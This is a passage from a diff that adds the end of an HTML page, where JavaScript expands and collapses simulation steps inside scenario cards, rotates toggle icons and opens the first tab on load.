+            const icon = element.querySelector('.toggle-icon');
+            
+            const container = element.closest('.scenario-card') || element.closest('.simulation-box');
+            if (container) {
+                const otherSteps = container.querySelectorAll('.sim-step');
+                otherSteps.forEach(step => {
+                    if (step !== element) {
+                        const stepContent = step.querySelector('.step-content');
+                        const stepIcon = step.querySelector('.toggle-icon');
+                        if (stepContent) {
+                            stepContent.classList.remove('active');
+                            stepContent.style.display = 'none';
+                        }
+                        if (stepIcon) {
+                            stepIcon.style.transform = 'rotate(0deg)';
+                        }
+                    }
+                });
+            }
+            
+            if (content) {
+                content.classList.toggle('active');
+                content.style.display = content.classList.contains('active') ? 'block' : 'none';
+            }
+            
+            if (icon) {
+                icon.style.transform = content && content.classList.contains('active') ? 'rotate(180deg)' : 'rotate(0deg)';
+            }
+        }
+
+        window.addEventListener('load', () => switchTab('tab1'));
+    </script>
+</body>
+</html>
